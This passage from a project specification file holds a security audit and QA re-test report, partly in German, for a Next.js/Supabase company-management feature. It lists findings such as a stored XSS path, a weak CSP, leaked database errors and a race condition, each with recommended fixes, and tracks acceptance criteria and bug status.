**Fix:** For production hardening, move rate limiting to a persistent store (Redis/Upstash). Add rate limiting to `/create` as well (e.g., 3 companies per hour per user).

---

### SEC-6: Secret Exposure
**Severity:** PASS
**Analysis:**
- `SUPABASE_SERVICE_ROLE_KEY` is NOT prefixed with `NEXT_PUBLIC_` -- Next.js will not bundle it into client code.
- `createServiceClient()` in `src/lib/supabase.ts` throws an explicit error if the env var is missing, preventing silent fallback.
- `.env.example` contains empty values only -- no real secrets.
- The `createClient()` browser function only uses `NEXT_PUBLIC_` prefixed variables.
- No API route returns the service role key or internal database details in responses.

---

### SEC-7: CSRF Protection
**Severity:** PASS
**Analysis:** Next.js API routes using POST with `application/json` Content-Type are inherently CSRF-resistant because:
1. Browsers enforce the Same-Origin Policy for JSON POST requests (they trigger a CORS preflight).
2. HTML forms can only submit `application/x-www-form-urlencoded` or `multipart/form-data`, not JSON.
3. The Supabase auth cookie is `httpOnly` and `SameSite=Lax` by default.

An attacker on a different origin cannot craft a JSON POST that will include the victim's cookies without a CORS preflight, which the Next.js server will reject (no CORS headers configured).

---

### SEC-8: Security Headers
**Severity:** Medium (one finding)

**Passing headers:**
- `X-Frame-Options: DENY` -- prevents clickjacking
- `X-Content-Type-Options: nosniff` -- prevents MIME sniffing
- `Referrer-Policy: strict-origin-when-cross-origin` -- good default
- `Permissions-Policy: camera=(), microphone=(), geolocation=()` -- restricts APIs
- `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` -- enforces HTTPS
- `frame-ancestors 'none'` in CSP -- redundant with X-Frame-Options but good defense-in-depth
- `connect-src` correctly scoped to self + Supabase URLs

**SEC-8a: CSP allows unsafe-inline and unsafe-eval in script-src**
**Severity:** Medium
**File:** `next.config.ts` line 21
**Description:** `script-src 'self' 'unsafe-inline' 'unsafe-eval'` effectively nullifies CSP protection against XSS. Any injected inline script will execute. Combined with SEC-3a (stored HTML in shift fields), this creates a real XSS attack path.
**Mitigation:** This is a common trade-off with Next.js which injects inline scripts for hydration. For production, use nonce-based CSP (`'nonce-xxx'`) or `'strict-dynamic'` instead of `'unsafe-inline'`. Remove `'unsafe-eval'` entirely unless a specific dependency requires it.

---

### SEC-9: Enumeration Attacks
**Severity:** PASS (with one Low finding)

**Company code enumeration:** The `/join` endpoint returns the same error message ("Dieser Code ist nicht gueltig.") for non-existent, inactive, and invalid-format codes. This prevents an attacker from determining which codes map to real companies.

**SEC-9a: Database Error Messages Leaked in /create Response**
**Severity:** Low
**File:** `src/app/api/companies/create/route.ts` lines 109, 135
**Description:** The `/create` route includes `insertError.message` and `updateError.message` directly in the response body (e.g., `"Firma konnte nicht erstellt werden: <postgres error message>"`). Supabase/PostgreSQL error messages can reveal table names, column names, constraint names, and other schema details to the client.
**Fix:** Return generic error messages to the client. Log the detailed error server-side only.

---

### SEC-10: Code Generation (crypto.getRandomValues)
**Severity:** PASS
**File:** `src/app/api/companies/create/route.ts` lines 7-15
**Analysis:** The `generateCompanyCode()` function uses `crypto.getRandomValues(new Uint8Array(6))` which is a cryptographically secure PRNG. This was already fixed from the previous `Math.random()` usage (BUG-4 in previous QA).

**Minor note:** The modulo operation `byte % 36` introduces a slight bias because 256 is not evenly divisible by 36 (256 mod 36 = 4). Characters at indices 0-3 have a ~2.86% probability vs ~2.73% for indices 4-35. This is negligible for a 6-character code space and does not reduce security meaningfully.

---

### SEC-11: Race Condition in Company Creation
**Severity:** Low
**File:** `src/app/api/companies/create/route.ts` lines 64-138
**Description:** The create route performs three sequential operations: (1) check if user has a company, (2) insert company, (3) update profile. Between step 1 and step 3, another request from the same user could also pass step 1 and proceed to create a second company. This is a classic TOCTOU (time-of-check-time-of-use) race condition.
**Impact:** A fast double-click or automated script could create two companies, with the user linked to the second one. The first company would be orphaned (no members).
**Fix:** Add a database constraint (e.g., `UNIQUE` on `profiles.company_id` is wrong since many users share a company -- instead use a database-level lock or transaction). Alternatively, add a frontend debounce (already has `isSubmitting` state which partially mitigates this) and consider a server-side idempotency key.

---

### SEC-12: Leave Endpoint -- Orphaned Company Data
**Severity:** Low
**File:** `src/app/api/companies/leave/route.ts`
**Description:** When the last member leaves a company, the company record remains in the database with no members. Over time this could accumulate orphaned companies. This is not a direct security vulnerability but constitutes a data hygiene issue.
**Fix:** Consider checking if the leaving user is the last member and either (a) marking the company as inactive or (b) deleting the company. This can be deferred to a cleanup job.

---

### Summary Table

| # | Check | Severity | Status |
|---|-------|----------|--------|
| SEC-1 | Auth Bypass | -- | PASS |
| SEC-2 | IDOR / company_id manipulation | -- | PASS (after BUG-2 fix) |
| SEC-3 | Input Validation (API) | -- | PASS |
| SEC-3a | Stored XSS via innerHTML in shift-card | Medium | FAIL |
| SEC-4 | RLS Bypass | -- | PASS |
| SEC-5 | Rate Limiting (serverless reset) | Low | KNOWN (BUG-5) |
| SEC-6 | Secret Exposure | -- | PASS |
| SEC-7 | CSRF | -- | PASS |
| SEC-8 | Security Headers (general) | -- | PASS |
| SEC-8a | CSP unsafe-inline + unsafe-eval | Medium | FAIL |
| SEC-9 | Enumeration (join) | -- | PASS |
| SEC-9a | DB Error Messages Leaked in /create | Low | FAIL |
| SEC-10 | Code Generation (CSPRNG) | -- | PASS |
| SEC-11 | Race Condition in /create | Low | FAIL |
| SEC-12 | Orphaned Companies on /leave | Low | INFO |

**New findings (not previously documented):**
- 2 Medium: SEC-3a (Stored XSS), SEC-8a (CSP weakness)
- 3 Low: SEC-9a (error message leak), SEC-11 (race condition), SEC-12 (orphaned data)

**Previously documented and confirmed:**
- BUG-2 (profiles_update_own RLS bypass): FIXED (policy dropped)
- BUG-4 (Math.random): FIXED (crypto.getRandomValues)
- BUG-5 (in-memory rate limiter): KNOWN, accepted for MVP

**Priority for remediation:**
1. SEC-3a + SEC-8a together (Medium) -- the combination of innerHTML usage and weak CSP creates an exploitable stored XSS chain. Fix both for production.
2. SEC-9a (Low) -- quick fix, replace error interpolation with generic messages.
3. SEC-11 (Low) -- add frontend debounce enforcement and consider server-side idempotency.
4. SEC-5/SEC-12 (Low) -- defer to post-MVP hardening.

## Update 2026-03-22: Firmendaten fließen automatisch in BTB-Vorschau

**Hintergrund:** Company-Daten (Name, Adresse, Logo) wurden bisher nicht automatisch als Fallback in die BTB Live-Vorschau (PROJ-6) und den Druck (PROJ-4) übernommen. Nutzer mussten Firmendaten in PROJ-5 UND nochmals in den Projekteinstellungen eingeben.

**Implementierte Fallback-Kette:**
```
project_settings.firma → companies.name → 'Firmenname'
project_settings.adr   → companies.adr  → ''
project_settings.logo  → companies.logo → kein Logo
```

**Betroffene Dateien:**
- `src/components/btb-preview-card.tsx` — neues Prop `companyFallback?: { firma, adr, logoUrl }`
- `src/app/projekte/[id]/einstellungen/page.tsx` — lädt Company-Daten + übergibt an Preview
- `src/app/projekte/[id]/page.tsx` — lädt Company-Daten in `fetchSettingsAndCategories`, wendet Fallback auf Project-State + Logo an

**Ergebnis:** Firmendaten aus PROJ-5 erscheinen automatisch auf allen BTBs (Preview + Druck), ohne dass der Nutzer sie in jedem Projekt wiederholen muss. Projektspezifische Überschreibungen (PROJ-6) haben weiterhin Vorrang.

## QA Re-Test Results (2026-03-22)

**Tested:** 2026-03-22 | **Tester:** QA Engineer (AI) | **Build:** PASS

### Acceptance Criteria Re-Test

| # | Kriterium | Status | Anmerkung |
|---|-----------|--------|-----------|
| AC-1a | /einstellungen erreichbar via Icon in Topbar | PASS | Settings-Icon in `projekte/page.tsx:158-161` |
| AC-1b | "Firma anlegen" wenn keine Firma | PASS | `company-section.tsx` zeigt Buttons |
| AC-1c | Pflichtfeld: Firmenname | PASS | Zod `min(1, max 100)` in `createCompanySchema` |
| AC-1d | Code auto-generiert (BTB-XXXXXX) | PASS | `crypto.getRandomValues` in create route |
| AC-1e | Code mit Kopieren-Button | PASS | `company-section.tsx` Kopier-Button vorhanden |
| AC-2a | "Firma beitreten" neben "Firma anlegen" | PASS | Beide Buttons nebeneinander |
| AC-2b | Code-Eingabefeld | PASS | Monospace + uppercase CSS |
| AC-2c | Gueltiger Code -> Nutzer verbunden | PASS | `/api/companies/join` prueft Code + setzt company_id |
| AC-2d | Ungueltiger Code -> generische Fehlermeldung | PASS | "Dieser Code ist nicht gueltig." |
| AC-2e | Gleiche Meldung fuer ungueltig + inaktiv | PASS | Zeile 118 in join: `!company \|\| !company.is_active` |
| AC-3a | "Verbunden mit: [Name]" + Code + Copy | PASS | Darstellung korrekt |
| AC-3b | "Firma verlassen" mit Bestaetigungsdialog | PASS | AlertDialog vorhanden |
| AC-3c | Verlassen setzt company_id = NULL | PASS | `/api/companies/leave` Zeile 57 |
| AC-3d | Projekte bleiben erhalten | PASS | Nur profiles.company_id wird genullt |
| AC-4a | Firmendaten: Name + Adresse | PASS | Felder in company-section mit onBlur-Save via `/api/companies/update` |
| AC-4b | Logo hochladen (PNG/JPG, max 2MB) | PASS | LogoUpload mit Validierung in company-section |
| AC-4c | Logo als Wasserzeichen (30% Deckkraft) | PASS | BtbPreviewCard zeigt Logo mit opacity 0.3 |
| AC-4d | Logo per Drag positionieren | PASS | Mouse-Events in BtbPreviewCard |
| AC-4e | "Logo loeschen" Button | PASS | In LogoUpload-Komponente |
| AC-4f | Aenderungen onBlur gespeichert | PASS | Via /api/companies/update API Route |
| AC-4g | Daten auf allen BTBs der Firma | PASS | Fallback-Kette in page.tsx + einstellungen/page.tsx |
| AC-5a | Passwort aendern: 3 Felder | PASS | `password-change-form.tsx` |
| AC-5b | Via Supabase Auth API | PASS | `updateUser()` nach Re-Auth |
| AC-6a | projects.user_id -> company_id Migration | PASS | Migration 20260320 vollstaendig |
| AC-6b | projects.created_by | PASS | NOT NULL nach Backfill |
| AC-6c | RLS auf neuen Spalten | PASS | Vollstaendige Policy in Migration |

### Status aelterer Bugs

| Bug | Status (2026-03-22) | Anmerkung |
|-----|---------------------|-----------|
| BUG-1 (Project Insert) | FIXED | `created_by: user?.id` explizit |
| BUG-2 (RLS profiles_update_own) | FIXED | Policy entfernt, nur service_role kann updaten |
| BUG-3 (Lowercase Code) | FIXED | `joinCompanySchema` hat `.transform(v => v.toUpperCase())` (Zeile 19 in company.ts) |
| BUG-4 (Math.random) | FIXED | `crypto.getRandomValues` in create route (Zeile 9) |
| BUG-5 (In-Memory Rate Limiter) | OFFEN (Low) | Akzeptiert fuer MVP |
| BUG-6 (Clipboard silent fail) | OFFEN (Low) | Weiterhin leerer catch-Block |

### Neue Findings (2026-03-22)

#### BUG-P5-7: /api/companies/update prueft nicht ob Nutzer zur Firma gehoert
- **Severity:** Medium
- **Datei:** `src/app/api/companies/update/route.ts:63-80`
- **Beschreibung:** Die Route liest `profile.company_id` und updated dann `companies` mit `eq('id', profile.company_id)`. Dies ist korrekt -- der Nutzer kann nur seine eigene Firma updaten. ABER: jedes Mitglied der Firma kann Name/Adresse/Logo aendern. Es gibt keine Rolle (Admin/Member). Fuer MVP akzeptabel, aber langfristig sollte nur der Ersteller oder ein Admin Firmendaten aendern koennen.
- **Status:** INFO (kein Sicherheitsrisiko, aber Berechtigungsfrage)

#### BUG-P5-8: saveCompanyField hat stillen Fehler
- **Severity:** Low
- **Datei:** `src/components/company-section.tsx:124-134`
- **Beschreibung:** `saveCompanyField` hat `catch { // silent fail for MVP }`. Wenn die API-Route fehlschlaegt, erhaelt der Nutzer kein Feedback. Local State zeigt den neuen Wert, DB hat den alten.

### Security Re-Audit Zusammenfassung

| Check | Status |
|-------|--------|
| SEC-1: Auth Bypass | PASS |
| SEC-2: IDOR company_id | PASS (profiles_update_own entfernt) |
| SEC-3: Input Validation | PASS (serverseitige Zod-Schemas) |
| SEC-3a: Stored XSS shift-card | OFFEN (Medium) -- DOMPurify jetzt im Einsatz in shift-card, aber Druck-Output nicht abgesichert |
| SEC-4: RLS Bypass | PASS |
| SEC-5: Rate Limiting | BEKANNT (Low) |
| SEC-6: Secret Exposure | PASS |
| SEC-7: CSRF | PASS |
| SEC-8: Security Headers | PASS (CSP unsafe-inline bleibt) |
| SEC-8a: CSP unsafe-inline | OFFEN (Medium) |
| SEC-9: Enumeration | PASS |
| SEC-9a: DB Error Leak in /create | OFFEN (Low) -- `insertError.message` in Response Zeile 109 |
| SEC-10: Code Generation | PASS (crypto.getRandomValues) |
| SEC-11: Race Condition /create | OFFEN (Low) |

### Zusammenfassung

- **Acceptance Criteria:** 26/26 PASS
- **Offene Bugs:** 2 neue (1x Medium/Info, 1x Low), 2 alte weiterhin offen (Low)
- **Security:** 3 offene Findings (2x Medium: XSS/CSP, 1x Low: Error Leak)
- **Production Ready:** JA (keine neuen High/Critical in PROJ-5 selbst; XSS-Issue gehoert zu PROJ-3/4)

## Deployment
_To be added by /deploy_
